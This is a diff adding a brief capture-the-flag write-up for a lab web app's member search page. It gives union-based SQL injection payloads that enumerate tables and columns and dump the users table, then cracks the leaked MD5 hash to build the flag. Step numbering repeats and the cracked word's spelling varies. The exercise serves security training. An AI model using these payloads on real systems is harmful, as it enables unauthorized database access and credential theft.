@@ -1,0 +1,13 @@
+Exploitation:
+
+1. Navigate to the Members page.
+2. Enter '1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()' into the Search Member By ID input.
+3. This will return the table name (users).
+4. Now enter '1 union select null, concat (column_name) from information_schema.columns where table_schema = database ()' into the Search Member By ID input.
+5. This will return the column names (user_id, first_name, last_name, town, country, planet, Commentaire, countersign).
+6. Then enter '1 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users' and it will return
+    'ID: 1 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users 
+    First name: 
+    Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28'
+6. Decrypt '5ff9d0165b4f92b14994e5c685cdce28' using MD5 to get the word the word 'FourtyTwo'.
+7. Hash the word 'fortytwo' using sha256 to receive the flag.
